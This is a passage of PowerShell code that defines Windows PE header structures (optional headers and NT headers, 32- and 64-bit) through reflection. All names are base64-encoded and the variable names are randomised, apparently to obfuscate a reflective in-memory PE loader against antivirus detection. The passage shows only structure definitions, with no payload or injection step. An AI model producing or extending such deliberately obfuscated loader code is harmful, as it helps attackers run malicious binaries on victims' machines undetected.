		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${2b7afcea43e44076ae3663c8e7b3e839}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${141b7e7c1802465788221644c435cc8e} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${141b7e7c1802465788221644c435cc8e}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 224)
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${6becacea128d4982b740c93a9d7eee7a}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${dd22fc91120d4a2095024406e77dc4da}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${2b7afcea43e44076ae3663c8e7b3e839}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${e4041524248349f4959abc935070a96e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${20d2abe55fa9478ea915892ee916788f} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${20d2abe55fa9478ea915892ee916788f}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 264)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${3cb53778ea2340439f20917b68e9ad27}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${141b7e7c1802465788221644c435cc8e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${0c4c723d0e6f404ab6052c5ecbbbe5a1} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${0c4c723d0e6f404ab6052c5ecbbbe5a1}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 248)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${3cb53778ea2340439f20917b68e9ad27}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
